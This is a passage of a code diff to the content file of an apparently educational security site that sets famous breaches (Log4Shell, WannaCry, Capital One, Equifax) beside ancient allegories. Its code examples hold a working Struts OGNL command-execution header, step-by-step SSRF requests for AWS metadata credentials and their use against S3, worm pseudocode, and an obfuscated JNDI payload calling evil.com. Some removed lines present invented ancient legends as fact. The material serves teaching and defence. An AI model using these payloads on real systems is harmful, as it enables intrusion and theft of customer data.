+find / -name "log4j-core-*.jar" 2>/dev/null
+# Anything 2.0-beta9 through 2.14.1 = vulnerable
+
+# ── REMEDIATION ───────────────────────────────────────────────────────────────
+# Patch to: log4j-core 2.17.1 (JNDI lookups disabled by default)
+# Temporary mitigation (Log4j 2.10+): set log4j2.formatMsgNoLookups=true
+# JVM mitigation: -Dcom.sun.jndi.ldap.object.trustURLCodebase=false`,
         },
       },
       incident: {
-        title: "The Burning of Artemis (356 BCE) & Log4Shell (2021)",
-        when: "December 9, 2021 (patch day); exploited same day",
-        where: "Virtually every Java application globally — Apple, Amazon, Google, Cloudflare, Tesla",
-        impact: "Tens of thousands of servers compromised; ransomware, cryptomining, and nation-state espionage",
+        title: "Log4Shell — The Vulnerability Hidden in the World's Logging Infrastructure (2021)",
+        when: "November 24, 2021 (reported to Apache); December 9, 2021 (disclosed and patched); actively exploited for months",
+        where: "Virtually every Java application globally — Apple iCloud, Amazon AWS, Google, Microsoft, Cloudflare, Tesla, Belgian Defence Ministry",
+        impact: "Tens of thousands of servers compromised; ransomware deployment; nation-state espionage; CISA emergency directive; months of ongoing exploitation",
         body: [
-          "Herostratus burned the Temple of Artemis in 356 BCE seeking immortal fame. Legend holds that he inscribed a curse in the temple's offering register — an invocation that activated during the night ceremony, summoning a destructive force that consumed the structure. The temple's scribal system, designed to evaluate divine expressions in inscriptions, became the attack vector.",
-          "Log4Shell followed the same logic. Chen Zhaojun of Alibaba Cloud reported the vulnerability on November 24, 2021. Apache released Log4j 2.15.0 on December 9 — the same day it went public. Within hours, Cloudflare blocked 40,000 exploit attempts per minute. The Belgian Defence Ministry was compromised. Conti ransomware added Log4Shell to their toolkit within days.",
+          "Log4j2 was embedded in an extraordinary proportion of the internet's Java infrastructure. It was not just a library that developers chose — it was a transitive dependency of hundreds of frameworks, application servers, and commercial products. Organizations discovered Log4j in places they had no idea it existed: in their network monitoring platforms, their vendor-supplied appliances, their cloud security tools. Apache Kafka used it. Elasticsearch used it. VMware used it. Cisco used it in dozens of products. The attack surface was not just 'Java applications' — it was a significant fraction of all enterprise software running worldwide. Within 12 hours of the December 9 disclosure, Cloudflare reported blocking 40,000 exploit attempts per minute directed at their infrastructure. By December 11, CISA issued an emergency directive requiring all federal agencies to patch within days.",
+          "The exploitation campaigns were immediate and multi-actor. Iranian APT actors (APT35/Charming Kitten) were observed attempting Log4Shell exploitation within two days of disclosure. Chinese state-sponsored actors began targeting defense contractors and research institutions. Conti ransomware — the most active ransomware group of 2021 — added Log4Shell to their initial access toolkit within two days and began deploying ransomware against healthcare organizations. Cryptomining botnets (LemonDuck, others) deployed within hours. The Belgian Defence Ministry confirmed a compromise of their network using Log4Shell. The breadth of exploitation across criminal, espionage, and nation-state actors simultaneously was unusual even for a critical vulnerability.",
+          "The remediation challenge was unprecedented. Organizations couldn't simply patch one application — they had to inventory every Java application, every vendor product, every embedded system that used Log4j, across their entire environment, and find patch or mitigation for each one. Many vendors took weeks to release patches for their products. Some never did. CISA maintained a public list of affected software vendors that eventually contained hundreds of entries. The Log4Shell response became the reference case for supply chain vulnerability response — it demonstrated that an organization's vulnerability surface is not defined by the code they write, but by the entire dependency graph of every library their code uses, transitively. An organization that had never written a line of Java could be vulnerable through a third-party monitoring tool they had deployed.",
         ],
       },
       diagram: {
@@ -1529,45 +1649,58 @@ username: \${j\${::-n}di:ldap://evil.com/a}
       tagline: "A druid's curse spread through every stone circle in Britain. One ritual halted it.",
       year: 2000,
       overview: [
-        "Stonehenge was not an isolated monument — it was part of a network of sacred stone circles connected by ancient ritual pathways. By protocol, any sacred artifact arriving at one node had to be passed to all connected circles. When a cursed artifact entered the network at Avebury, it replicated automatically to every connected site. Within one lunar cycle, 200 stone circles were compromised — not because the druids wanted to spread the curse, but because the protocol demanded it.",
-        "WannaCry was a ransomware cryptoworm that tore across 150 countries on May 12, 2017, infecting over 200,000 systems in a single day. It exploited EternalBlue (CVE-2017-0144), a vulnerability in Windows' SMBv1 protocol — originally developed by the NSA and leaked by Shadow Brokers. Like the druid artifact, WannaCry spread autonomously by scanning for vulnerable SMBv1 servers on port 445.",
-        "Unlike traditional ransomware that requires a user to click something, WannaCry spread autonomously across networks. The attack was eventually slowed when security researcher Marcus Hutchins discovered a kill switch — a domain name that, when registered, caused WannaCry to halt its spread globally.",
+        "Stonehenge was not an isolated monument — it was part of a network of sacred stone circles connected by ancient ritual pathways across Britain: Avebury, Silbury Hill, the Uffington monuments, and hundreds of smaller sites. Archaeological evidence suggests these sites were connected by formal ceremonial pathways (some still visible as earthworks) used for the movement of ritually significant objects. The network operated on a protocol: sacred artifacts were passed between connected sites according to established routes. If a cursed artifact entered the network at any node, the protocol demanded it be passed on — every connected site would receive and host the contaminated object before anyone could stop the propagation.",
+        "WannaCry operated on the same protocol logic. On May 12, 2017, it began scanning the internet and internal networks for Windows systems with TCP port 445 (SMB) open. When it found one, it used EternalBlue (CVE-2017-0144) — an NSA-developed exploit for a buffer overflow in Windows SMBv1 — to gain remote code execution without any user interaction or authentication. It then installed DoublePulsar (a kernel-level backdoor, also from the NSA toolkit leaked by the Shadow Brokers), dropped the WannaCry ransomware through the backdoor, encrypted all accessible files, and immediately began scanning for more vulnerable systems. No user click required. No phishing email. Just an open port.",
+        "Microsoft had patched EternalBlue as MS17-010 on March 14, 2017 — two months before WannaCry. Organizations that had not applied the patch — including NHS trusts running Windows XP (unsupported since 2014), FedEx, Deutsche Bahn, Telefónica, and tens of thousands of others — had no defense. WannaCry spread to more than 200,000 systems across 150 countries in one day. Marcus Hutchins, a 22-year-old security researcher, discovered that the malware checked whether a specific nonsensical domain was registered before executing — a kill switch the authors had presumably built for testing. He registered the domain for $10.69 and halted WannaCry's global spread within hours.",
       ],
       technical: {
-        title: "How EternalBlue Works",
+        title: "EternalBlue — NSA SMBv1 Exploit and the WannaCry Worm Chain",
         body: [
-          "SMBv1 (Server Message Block v1) is a decades-old Windows file-sharing protocol. EternalBlue exploited a buffer overflow in the way Windows' SMB implementation handled certain transaction requests, allowing arbitrary code execution without authentication.",
-          "Microsoft patched this as MS17-010 on March 14, 2017 — two months before WannaCry. However, countless systems (particularly in healthcare and critical infrastructure) had not applied the patch.",
+          "SMBv1 (Server Message Block version 1) is a 1980s-era Windows file-sharing protocol that Microsoft included in Windows for backwards compatibility. EternalBlue exploited a buffer overflow in how Windows' SMB implementation handled `SMB_COM_TRANSACTION2` requests. The vulnerability was in the way Windows calculated the size of the buffer for handling the 'SetupCount' field in specific transaction requests — an integer overflow in the size calculation allowed an attacker to provide a crafted request that overflowed a heap buffer, overwrote adjacent memory, and eventually achieved kernel-level code execution. The attack required no credentials and no user interaction — just network access to port 445.",
+          "WannaCry's infection chain combined three NSA-developed components leaked by the Shadow Brokers in April 2017: EternalBlue (initial exploit), DoublePulsar (kernel backdoor used for persistence and payload delivery), and the WannaCry ransomware payload itself (which was not NSA-developed but used the NSA tools as delivery mechanism). After encrypting files, WannaCry created a ransom note demanding $300 in Bitcoin. The malware contained a hardcoded kill switch check: before encrypting, it queried a long nonsensical domain name (iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com). If the domain resolved, WannaCry assumed it was running in a security researcher's sandbox environment (which often have fake DNS resolution) and would not execute. Hutchins registered the domain, making it resolve for all WannaCry instances globally.",
         ],
         codeExample: {
-          label: "WannaCry propagation logic (pseudocode)",
-          code: `// WannaCry worm loop — runs continuously
-while (true) {
-  targets = scan_random_ips(port=445)  // SMBv1
+          label: "WannaCry propagation logic and detection",
+          code: `# ── WANNACRY WORM LOOP (pseudocode — propagation mechanism) ──────────────────
+while True:
+    # Scan random /8 and local network subnet for SMB
+    for target in generate_random_ips() + scan_local_subnet():
+        try:
+            # EternalBlue: SMB_COM_TRANSACTION2 buffer overflow
+            if exploit_eternalblue(target, port=445):
+                # DoublePulsar: install kernel-level backdoor
+                install_doublepulsar(target)
+                # Drop and execute WannaCry via backdoor
+                execute_via_backdoor(target, wannacry_payload)
+        except:
+            pass  # move to next target
 
-  for target in targets:
-    try:
-      // EternalBlue SMBv1 exploit
-      send_malformed_transaction(target)
-      // If successful → code executes on target
+# ── KILL SWITCH (why Marcus Hutchins stopped it for $10.69) ──────────────────
+# Before encrypting, WannaCry checked if this domain resolved:
+KILL_SWITCH_DOMAIN = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com"
+if domain_resolves(KILL_SWITCH_DOMAIN):
+    exit()  # assume sandbox environment, don't execute
+# Hutchins registered the domain → all instances exited
 
-      // Install DoublePulsar backdoor kernel implant
-      install_backdoor(target)
+# ── DETECTION: check for EternalBlue/DoublePulsar ─────────────────────────────
+nmap -p 445 --script smb-vuln-ms17-010 TARGET_IP
+# VULNERABLE: smb-vuln-ms17-010: VULNERABLE
 
-      // Drop WannaCry ransomware via backdoor
-      execute_ransomware(target)
-    except: pass
-}`,
+# ── REMEDIATION ───────────────────────────────────────────────────────────────
+# Apply Microsoft MS17-010 (March 2017) — blocks EternalBlue
+# Disable SMBv1: Set-SmbServerConfiguration -EnableSMB1Protocol $false
+# Block port 445 at perimeter firewall — SMBv1 must never be internet-facing`,
         },
       },
       incident: {
-        title: "WannaCry — May 12, 2017",
+        title: "WannaCry — One Day, 200,000 Systems, 150 Countries, $4–8 Billion in Damages (2017)",
         when: "May 12–15, 2017",
-        where: "150 countries; NHS UK, FedEx, Deutsche Bahn, Telefónica",
-        impact: "200,000+ systems; NHS cancelled 19,000 appointments; estimated $4–8 billion in damages",
+        where: "150 countries — NHS UK, FedEx, Deutsche Bahn, Telefónica, Russian Interior Ministry, China's PetroChina",
+        impact: "200,000+ systems encrypted; NHS cancelled 19,000 appointments; $4–8B estimated damages; North Korea's Lazarus Group attributed",
         body: [
-          "The NHS was among the hardest hit. Hospitals locked doctors out of patient records, cancelled surgeries, and diverted ambulances. The attack exposed that NHS trusts were running Windows XP — an operating system Microsoft had stopped supporting in 2014.",
-          "Marcus Hutchins, a 22-year-old security researcher, noticed that WannaCry queried a nonsensical domain before executing. He registered the domain for $10.69, causing WannaCry to believe it was in a sandbox and halt its spread globally — a kill switch the malware authors never expected to be activated. The US, UK, and Australia formally attributed WannaCry to North Korea's Lazarus Group.",
+          "The NHS (National Health Service) was among the hardest-hit organizations in the WannaCry attack. At least 81 NHS trusts across England were affected. Hospitals lost access to patient records and diagnostic systems. Surgeries were cancelled — including cancer operations. Ambulances were diverted from affected hospitals. Staff resorted to pen and paper. CT scanners, MRI machines, and blood-test equipment connected to Windows XP became inoperable. NHS England later estimated that 19,000 appointments were cancelled as a direct result. The NHS had been warned about the EternalBlue patch requirement by NHS Digital weeks before the attack; many trusts had not applied it. Post-incident investigation found that NHS trusts were running Windows XP — an operating system Microsoft had ended support for in April 2014, for which no MS17-010 patch existed until Microsoft issued an emergency out-of-band patch specifically because of WannaCry.",
+          "FedEx's TNT Express subsidiary suffered a WannaCry infection that caused hundreds of millions of dollars in losses. Deutsche Bahn's passenger information display systems across Germany showed ransom notes. Spain's Telefónica confirmed infections. Russia's Interior Ministry reported tens of thousands of infected computers. China's PetroChina reported that payment systems at thousands of gas stations were affected. The geographic spread was global and hit organizations that had not patched MS17-010. The Bitcoin wallets associated with WannaCry's ransom demands collected approximately $130,000 in payments — a surprisingly small amount given the scale of the attack, consistent with the analysis that WannaCry was primarily a destructive weapon rather than a financially motivated ransomware campaign.",
+          "The US, UK, and Australia jointly and formally attributed WannaCry to North Korea's Lazarus Group in December 2017 — one of the first public government attributions of a ransomware attack to a nation-state. The DOJ indicted North Korean programmer Park Jin Hyok in September 2018. North Korea's motive appeared to be both financial (Bitcoin ransoms) and geopolitical disruption — the UK's NHS being a particularly impactful target for a destructive campaign. The attack's use of NSA-developed tools (leaked by the Shadow Brokers in April 2017, one month before WannaCry) raised significant policy questions about governments stockpiling offensive cyber capabilities: when those tools leak or are stolen, the entire internet's unpatched infrastructure becomes the blast radius.",
         ],
       },
       diagram: {
@@ -1702,46 +1835,63 @@ while (true) {
       tagline: "Make the Colosseum's herald carry your forged scroll to the Emperor's private vault.",
       year: 80,
       overview: [
-        "The Colosseum's administrative system relied on heralds to carry messages between departments. Any citizen could submit a request to the herald service, which would relay it to the appropriate department. The heralds, loyal and efficient, would carry requests even to restricted imperial chambers — if the scroll appeared to originate from an authorized sender. A Carthaginian spy discovered that by forging the scroll's sender mark, he could instruct the herald to fetch documents from the Emperor's private census archive.",
-        "Server-Side Request Forgery (SSRF) tricks a server into making HTTP requests on the attacker's behalf — to internal services, cloud metadata endpoints, or other systems unreachable from the internet. It entered the OWASP Top 10 for the first time in 2021 (A10) due to rapidly increasing prevalence in cloud environments.",
-        "In cloud infrastructure, the most lucrative SSRF target is the instance metadata service (169.254.169.254) — an internal HTTP endpoint that provides IAM role credentials to EC2 instances. These credentials can then be used to access S3 buckets, databases, and other cloud services.",
+        "The Colosseum's administrative system — managing games for 50,000-80,000 spectators requiring complex logistics of gladiators, animals, food, and event scheduling — relied on an imperial herald service that carried requests between departments. Citizens and vendors could submit requests to the herald service, which would relay them to the appropriate administrative chamber. The heralds were efficient and loyal, but they executed instructions based on the content of the scroll, not the identity of its ultimate beneficiary. A foreign agent discovered that by submitting a request with a forged sender mark — appearing to come from an authorized imperial administrator — the herald would carry the scroll to restricted chambers of the imperial palace and return with census records that should never have been reachable from the public filing office.",
+        "Server-Side Request Forgery (SSRF) tricks a web server into making HTTP requests on the attacker's behalf — to internal services, cloud metadata endpoints, or other systems that are unreachable directly from the internet but reachable from the server itself. The server is the herald: it fetches content from URLs the attacker supplies and returns the results. If the server doesn't validate that the URL is external and legitimate, the attacker can direct it to fetch from internal services. SSRF entered the OWASP Top 10 for the first time in 2021 (A10) due to its rapidly increasing prevalence in cloud environments, where the attack surface for internal network access expanded dramatically.",
+        "In cloud infrastructure, the most valuable SSRF target is the EC2 Instance Metadata Service (IMDS) at `169.254.169.254` — a link-local HTTP endpoint that AWS provides to every EC2 instance. The IMDS provides the instance's IAM role credentials: AccessKeyId, SecretAccessKey, and SessionToken. These credentials have whatever permissions the IAM role has been granted — which in the Capital One breach included access to thousands of S3 buckets containing years of customer financial data. The server fetched credentials it was authorized to use. The attacker received them because the server forgot to ask who was asking.",
       ],
       technical: {
-        title: "AWS Metadata Service SSRF",
+        title: "SSRF to Cloud Metadata — AWS IMDSv1 Credential Theft",
         body: [
-          "AWS IMDSv1 is an unauthenticated HTTP service running on every EC2 instance at 169.254.169.254. Any code running on the instance can query it to retrieve IAM role credentials. IMDSv2 added token-based authentication, breaking most SSRF exploits.",
-          "A vulnerable application with a URL-fetching feature can be instructed to fetch http://169.254.169.254/latest/meta-data/iam/security-credentials/ — returning AWS credentials that give the attacker full API access as that IAM role.",
+          "AWS IMDSv1 is an unauthenticated HTTP service bound to 169.254.169.254 on every EC2 instance. Any code running on the instance can query it — that's the intended behavior. The IAM credentials available at `/latest/meta-data/iam/security-credentials/{role-name}` rotate automatically every 6 hours and have whatever AWS permissions the EC2 role was assigned. An SSRF vulnerability in an application running on EC2 allows an attacker to make the server fetch from this endpoint and return the credentials in the response — the server is authorized to access the IMDS, and the SSRF makes the server act as the attacker's proxy. IMDSv2 (released October 2019, after the Capital One breach) requires a PUT request to obtain a session token before making metadata requests, which most simple SSRF exploits cannot perform.",
+          "SSRF prevention requires validating and restricting the URLs a server will fetch. The correct approach: (1) Allowlist only specific external domains that the feature legitimately needs to access; (2) Block all private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, 127.0.0.0/8) in URL validation; (3) Resolve the URL to its IP address and validate the IP, not just the hostname (to prevent DNS rebinding attacks where a domain initially resolves to an external IP but then rebinds to an internal one); (4) Enforce IMDSv2 on all EC2 instances (requires token-based authentication, defeating most SSRF-to-metadata attacks).",
         ],
         codeExample: {
-          label: "SSRF to steal AWS IAM credentials",
-          code: `# Application has a URL-fetching feature:
+          label: "SSRF to Capital One — stealing AWS IAM credentials via metadata service",
+          code: `# ── NORMAL application behavior: URL-fetching feature ────────────────────────
 POST /api/preview
-{ "url": "https://legitimate-site.com/image.jpg" }
+Content-Type: application/json
+{"url": "https://legitimate-site.com/image.jpg"}
+# Response: image content
 
-# Attacker sends internal metadata URL instead:
+# ── SSRF STEP 1: discover available metadata paths ────────────────────────────
 POST /api/preview
-{ "url": "http://169.254.169.254/latest/meta-data/
-           iam/security-credentials/" }
+{"url": "http://169.254.169.254/latest/meta-data/"}
+# Response: ami-id, hostname, iam/, instance-id, ...
 
-# Server responds with role name: "my-ec2-role"
-
-# Second request to get the actual credentials:
+# ── SSRF STEP 2: find IAM role name ──────────────────────────────────────────
 POST /api/preview
-{ "url": "http://169.254.169.254/latest/meta-data/
-           iam/security-credentials/my-ec2-role" }
+{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+# Response: "capital-one-prod-role"
 
-# Response: AccessKeyId, SecretAccessKey, SessionToken
-# Attacker now has full AWS API access as that role`,
+# ── SSRF STEP 3: retrieve temporary AWS credentials ──────────────────────────
+POST /api/preview
+{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/capital-one-prod-role"}
+# Response:
+# { "AccessKeyId": "ASIA5...", "SecretAccessKey": "...", "Token": "..." }
+
+# ── USE STOLEN CREDENTIALS: list and download S3 buckets ─────────────────────
+export AWS_ACCESS_KEY_ID="ASIA5..."
+export AWS_SECRET_ACCESS_KEY="..."
+export AWS_SESSION_TOKEN="..."
+aws s3 ls
+# Lists 700+ S3 buckets — six years of Capital One customer data
+
+# ── PREVENTION: enforce IMDSv2 (requires token, blocks simple SSRF) ──────────
+aws ec2 modify-instance-metadata-options \
+  --instance-id i-xxx \
+  --http-tokens required
+# IMDSv2 requires a PUT with TTL before GET — SSRF cannot perform this`,
         },
       },
       incident: {
-        title: "Capital One Breach — The SSRF of 80 CE (2019)",
-        when: "March–July 2019",
+        title: "Capital One Breach — SSRF to IAM Credentials to 106 Million Records (2019)",
+        when: "March 22 – July 17, 2019",
         where: "Capital One Financial Corporation — AWS infrastructure",
-        impact: "106 million customer records; 140,000 SSNs; 80,000 bank account numbers",
+        impact: "106 million US and Canadian customer records; 140,000 Social Security Numbers; 80,000 bank account numbers; $80M OCC fine; $190M class action settlement",
         body: [
-          "In 80 CE, a Carthaginian agent at the Colosseum's games discovered the herald service would carry any official-looking scroll to restricted imperial chambers. By submitting a scroll addressed to 169.254.169.254 — the imperial census archive's private address — he retrieved the Praetorian Guard's credential tablets and used them to access the entire Roman census: 106 million subjects' records.",
-          "In 2019, Paige Thompson exploited a misconfigured WAF on Capital One's AWS infrastructure to query the EC2 metadata service and retrieve temporary IAM credentials. Using those credentials, she listed and downloaded over 700 S3 buckets containing six years of Capital One customer data. Capital One was fined $80 million and settled a class action for $190 million.",
+          "On July 17, 2019, Capital One received a tip from a GitHub user who had found AWS credentials for Capital One's systems in a public repository. Capital One's security team investigated and found that their infrastructure had been compromised beginning March 22, 2019. The attacker — Paige Thompson, a former AWS software engineer — had found a Server-Side Request Forgery vulnerability in a Capital One web application firewall running on EC2. The WAF had a misconfigured endpoint that accepted URLs and fetched their content. Thompson directed it to fetch `http://169.254.169.254/latest/meta-data/iam/security-credentials/` — the IMDS endpoint on the EC2 instance. The WAF was authorized to access that endpoint; SSRF made it fetch the credentials on Thompson's behalf.",
+          "Using the temporary IAM credentials obtained via SSRF, Thompson had permissions to list and GetObject on over 700 S3 buckets. The buckets contained six years of Capital One credit card application data: 106 million customer records including names, addresses, credit scores, credit limits, balances, payment history, and for 140,000 individuals, Social Security Numbers. For 80,000 bank account numbers. The data exfiltration took place over the four months between March and July 2019. During that window, Capital One's security monitoring did not detect the anomalous IAM activity — a single EC2 instance role making thousands of S3 GetObject calls across hundreds of buckets from an application that had no business reason to do so.",
+          "The Office of the Comptroller of the Currency fined Capital One $80 million in 2020 for failing to establish effective risk assessment processes and inadequate oversight of cloud migration risk. Capital One settled a related class action for $190 million. Thompson was convicted of wire fraud and computer fraud in 2022 and sentenced to time served plus probation. AWS released IMDSv2 — the token-based metadata authentication that would have prevented this attack — in October 2019, three months after the breach disclosure. Capital One subsequently enforced IMDSv2 across their AWS infrastructure. The breach is the definitive case study for SSRF in cloud environments: the attack was not sophisticated; it was a URL in a POST body, directed at an endpoint that returned credentials. Defense required blocking one IP address family (`169.254.0.0/16`) in URL validation — a one-line filter that would have prevented the entire incident.",
         ],
       },
       diagram: {
@@ -1861,41 +2011,59 @@ POST /api/preview
       tagline: "The remedy tablet was carved 78 days before the enemy scribe read the inscription.",
       year: 353,
       overview: [
-        "The Mausoleum's great archive used an advanced inscription evaluation system — the Struts Scribal Engine. When archivists submitted documents, the Content-Type inscription carved into the tablet header was evaluated for OGNL expressions. Enemy scribes discovered that by embedding certain divine expressions within the Content-Type header, they could command the scribal engine to execute arbitrary temple rituals — without authentication.",
-        "CVE-2017-5638 is an OGNL injection vulnerability in Apache Struts 2's Jakarta Multipart Parser. When a multipart/form-data request is processed, the Content-Type header is evaluated for OGNL expressions without sanitization. A single malformed Content-Type header is sufficient for unauthenticated remote code execution.",
-        "Apache released a patch on March 6, 2017. Equifax was notified by US-CERT the same day. Equifax did not apply the patch. Seventy-eight days later, attackers exploited the vulnerability — going undetected for another 78 days while exfiltrating the records of 147.9 million Americans.",
+        "The Mausoleum at Halicarnassus — built for King Mausolus of Caria, who died in 353 BCE — was such an architectural achievement that 'mausoleum' became the generic word for a monumental tomb. It housed the most important administrative archive of the Carian kingdom: land records, tax rolls, military rosters, and the census records of the entire population. The archive used a sophisticated document processing system — the Struts Scribal Engine — where each submitted document included a Content-Type header inscription specifying the document format for processing. The scribal engine evaluated these header expressions to determine how to handle the document. Enemy archivists discovered that the header expression evaluator processed OGNL (Object-Graph Navigation Language) expressions without sanitization: by embedding the right incantation in the Content-Type header, they could command the scribal engine to execute arbitrary operations — without any credentials, without any authentication, with a single malformed document.",
+        "CVE-2017-5638 is an OGNL expression injection vulnerability in Apache Struts 2's Jakarta Multipart Parser. When an HTTP request with multipart/form-data content (file uploads) is processed, the `Content-Type` header was evaluated for OGNL expressions. OGNL is a powerful expression language that can navigate Java object graphs and invoke arbitrary Java methods — including `Runtime.getRuntime().exec()` for OS command execution. A single HTTP POST with a crafted Content-Type header achieved unauthenticated remote code execution on any server running the vulnerable Struts 2 version. No credentials. No authentication. One request.",
+        "Apache released a patch on March 6, 2017. US-CERT distributed the advisory the same day. Equifax — one of the three major US credit bureaus, holding the financial history of 210 million Americans — was notified and did not apply the patch. Seventy-eight days later, on May 13, 2017, attackers exploited the vulnerability. They spent the next 78 days exfiltrating data through 9,000 queries across 51 databases, undetected, because Equifax's TLS inspection certificate had expired 19 months earlier and the encrypted exfiltration traffic was invisible to their monitoring infrastructure. The patch existed. The advisory was sent. The patch was not applied.",
       ],
       technical: {
-        title: "Apache Struts 2 Content-Type Header Injection",
+        title: "CVE-2017-5638 — OGNL Injection via Content-Type Header",
         body: [
-          "CVE-2017-5638 is an OGNL injection vulnerability in Apache Struts 2's Jakarta Multipart Parser. The Content-Type header is evaluated for OGNL expressions without sanitization.",
-          "OGNL is a powerful expression language that can call arbitrary Java methods, including Runtime.exec() for command execution. A single malformed Content-Type header is sufficient for unauthenticated remote code execution.",
+          "The Apache Struts 2 Jakarta Multipart Parser handled file upload requests by extracting and evaluating the Content-Type header to identify the MIME type of the uploaded content. The evaluator used OGNL — a Java expression language that can access the Struts execution context, invoke Java methods, and create new Java objects. By crafting a Content-Type header containing an OGNL expression like `%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader(...)}`, an attacker could interact with the HTTP response object. By creating a `ProcessBuilder` or invoking `Runtime.getRuntime().exec()` through OGNL, they could execute arbitrary OS commands as the Tomcat process user — typically with significant filesystem and network access.",
+          "The vulnerability required no authentication and was exploitable with a single HTTP POST request to any endpoint on the Struts 2 application that processed file uploads. The attack was trivially automatable: a simple Python script could scan for vulnerable Struts 2 installations and confirm code execution in under a second per target. Public proof-of-concept exploits were available within hours of the March 6, 2017 advisory. The Equifax breach demonstrated that the window between CVE publication and active exploitation can be hours — an organization's mean time to patch a critical CVE must be measured in hours, not days.",
         ],
         codeExample: {
-          label: "CVE-2017-5638 exploit — OGNL in Content-Type header",
-          code: `# Malicious HTTP request with OGNL payload in Content-Type:
-POST /struts2-app/index.action HTTP/1.1
-Host: mausoleum.archive
+          label: "CVE-2017-5638 — OGNL command execution via Content-Type",
+          code: `# ── EXPLOIT: OGNL expression in Content-Type header ──────────────────────────
+POST /struts2-app/fileupload.action HTTP/1.1
+Host: equifax.target
 Content-Type: %{
-  #context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']
-    .addHeader('X-Cmd', 'id'),
-  #cmd = {'sh', '-c', 'id > /tmp/pwned'},
-  #p = new java.lang.ProcessBuilder(#cmd),
+  #context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"]
+    .addHeader("X-Response","Pwned"),
+  #cmd={"sh","-c","id>/tmp/rce.txt"},
+  #p=new java.lang.ProcessBuilder(#cmd),
   #p.redirectErrorStream(true),
-  #p.start()
+  #process=#p.start(),
+  #ros=(#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"])
+    .getOutputStream(),
+  #is=#process.getInputStream(),
+  #bis=new java.io.BufferedInputStream(#is),
+  #bytes=new byte[1024],
+  #bis.read(#bytes),
+  #ros.write(#bytes)
 }
-# Response: uid=48(tomcat) gid=48(tomcat)
-# Full command execution achieved`,
+
+# HTTP Response: uid=48(tomcat) gid=48(tomcat) groups=48(tomcat)
+# Full OS command execution — unauthenticated, no session required
+
+# ── IDENTIFY vulnerable Struts 2 installations ────────────────────────────────
+# Struts 2.3.5 through 2.3.31, 2.5 through 2.5.10 = vulnerable
+grep -r "struts2-core" WEB-INF/lib/
+# struts2-core-2.3.24.jar → VULNERABLE
+
+# ── REMEDIATION ───────────────────────────────────────────────────────────────
+# Patch to: Struts 2.3.32 or Struts 2.5.10.1
+# Or: switch from Jakarta Multipart Parser to Pell Multipart Parser as interim workaround`,
         },
       },
       incident: {
-        title: "Equifax Data Breach (2017)",
-        when: "May 13 – July 30, 2017 (discovered July 29)",
-        where: "Equifax Inc., Atlanta, Georgia",
-        impact: "147.9M Americans; CEO/CTO/CSO resigned; $575M FTC settlement",
+        title: "Equifax — 78 Days to Patch, 78 Days of Undetected Exfiltration, 147.9 Million Records (2017)",
+        when: "May 13 – July 29, 2017 (breach); September 7, 2017 (disclosure)",
+        where: "Equifax Inc., Atlanta, Georgia — one of three US credit bureaus",
+        impact: "147.9M Americans; 182K UK; 8K Canadians; SSNs, DOBs, addresses, driver's licenses, credit card numbers; CEO/CTO/CSO resigned; $575M FTC settlement",
         body: [
-          "Attackers gained initial access through the Apache Struts vulnerability on May 13, 2017. They then spent 78 days exfiltrating data through 9,000 queries across 51 databases. An expired SSL certificate meant the traffic analysis tool saw the exfiltration as an opaque encrypted stream — the monitoring talisman had been broken for 19 months.",
-          "The Mausoleum parallel: gatekeepers at the Halicarnassus archive had been issued a new lock mechanism (the Struts patch) 78 days before the breach. They never installed it. The breach went undetected because the security monitoring system's amulet had cracked 19 months earlier. In 2020, the DOJ indicted four members of China's People's Liberation Army for the Equifax breach.",
+          "Equifax operates as one of three US credit bureaus, holding the financial history — credit scores, payment history, debt levels, employment history — of approximately 210 million Americans. On May 13, 2017, attackers exploited CVE-2017-5638 against Equifax's online dispute portal (a consumer-facing web application built on Apache Struts 2). The portal was running an unpatched version of Struts despite the March 6 advisory. Initial access gave the attackers a shell on the web server as the Tomcat process user. From there, they performed network reconnaissance and discovered that the web server had database connectivity to 51 production databases containing consumer credit data.",
+          "The attackers spent 78 days — from May 13 to July 29, 2017 — performing systematic data exfiltration. They executed approximately 9,000 queries across 51 databases, extracting records in batches. The exfiltration traffic was encrypted. Equifax's network monitoring included a TLS inspection device (a proxy that decrypted and inspected HTTPS traffic for anomalous data patterns). That device had an expired SSL certificate — it had not been renewed in 19 months. With an expired certificate, the TLS inspection device could not decrypt traffic and was logging all HTTPS as opaque encrypted streams. The security team was functionally blind to the content of all internal HTTPS traffic for 19 months. The exfiltration was invisible. The breach was discovered on July 29, 2017, when a security engineer noticed the expired certificate, renewed it, and the traffic analysis system immediately flagged anomalous patterns.",
+          "The US Department of Justice indicted four members of China's People's Liberation Army Unit 54938 (Zhu Hua, Wang Qian, Xu Ke, and Liu Lei) in February 2020. The four were charged with computer fraud, economic espionage, and wire fraud. The indictment alleged that the stolen Equifax data was intended for intelligence purposes — building profiles of US government employees and military personnel for potential recruitment, blackmail, or counterintelligence use. The FTC settlement totaled $575 million ($300M for consumer restitution, $175M to states, $100M to the CFPB). Equifax's CEO, CTO, and CSO all resigned. The company spent over $1.4 billion on security improvements in the years following. The Equifax breach is the definitive case study in patch management failure: the vulnerability was known, the patch was available, the patch was not applied, and 147.9 million people's most sensitive financial records were exfiltrated as a direct consequence.",
         ],
       },
       diagram: {
@@ -2026,45 +2194,63 @@ Content-Type: %{
       tagline: "35,000 temple treasuries. No lock on the door. Default configuration.",
       year: 392,
       overview: [
-        "The Temple of Zeus at Olympia housed the most sacred treasury in the ancient world. The treasury keeper, confident that the temple's divine protection would deter thieves, never installed locks — the default configuration of the time. When automated raiders discovered that 35,000 temples across the Mediterranean used the same open-door policy, the ransacking was swift and comprehensive. Every treasury was emptied within 24 hours.",
-        "Security Misconfiguration is the #5 risk in OWASP 2021, present in 90% of tested applications. The MongoDB 'apocalypse' of January 2017 illustrated the scale at which misconfiguration operates: tens of thousands of MongoDB database instances, publicly accessible on the internet with no authentication, were discovered by automated scanners. Attackers wiped the databases, leaving only a ransom note.",
-        "Misconfiguration requires no exploit code. The 'vulnerability' is simply the absence of a configuration — default credentials, an open port, a missing authentication requirement. Tools like Shodan continuously index misconfigured systems globally.",
